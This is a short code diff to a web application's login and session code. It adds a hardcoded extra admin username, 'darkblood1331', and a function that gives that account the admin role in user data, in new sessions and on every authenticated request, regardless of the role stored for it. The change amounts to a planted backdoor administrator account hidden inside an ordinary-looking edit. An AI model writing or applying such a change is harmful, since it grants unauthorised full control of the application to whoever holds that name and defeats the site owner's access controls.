@@ -246,13 +246,21 @@ function getReservedAdminUsernameLower() {
   return normalizeUsername(process.env.ADMIN_USERNAME || 'Sungzeira_');
 }
 
+const EXTRA_ADMIN_USERNAMES = new Set(['darkblood1331']);
+
+function isAdminUser(user) {
+  if (!user) return false;
+  const lower = normalizeUsername(user.usernameLower || user.username || '');
+  return user.role === 'admin' || EXTRA_ADMIN_USERNAMES.has(lower);
+}
+
 function sanitizeUser(user) {
   if (!user) return null;
   const prefs = (user.preferences && typeof user.preferences === 'object') ? user.preferences : {};
   return {
     id: user.id,
     username: user.username,
-    role: user.role === 'admin' ? 'admin' : 'user',
+    role: isAdminUser(user) ? 'admin' : 'user',
     createdAt: user.createdAt,
     preferences: {
       theme: prefs.theme === 'dark' ? 'dark' : (prefs.theme === 'light' ? 'light' : null),
@@ -297,7 +305,7 @@ async function createSession(user) {
     userId: user.id,
     username: user.username,
     usernameLower: user.usernameLower,
-    role: user.role === 'admin' ? 'admin' : 'user',
+    role: isAdminUser(user) ? 'admin' : 'user',
     createdAt: now,
     lastSeenAt: now,
     expiresAt: now + SESSION_TTL_MS
@@ -331,6 +339,7 @@ async function getAuthenticatedUser(req, res, renew = true) {
 
   const user = await getUserByUsername(session.usernameLower);
   if (!user) return null;
+  if (isAdminUser(user)) user.role = 'admin';
   return { user, session, tokenHash };
 }
 
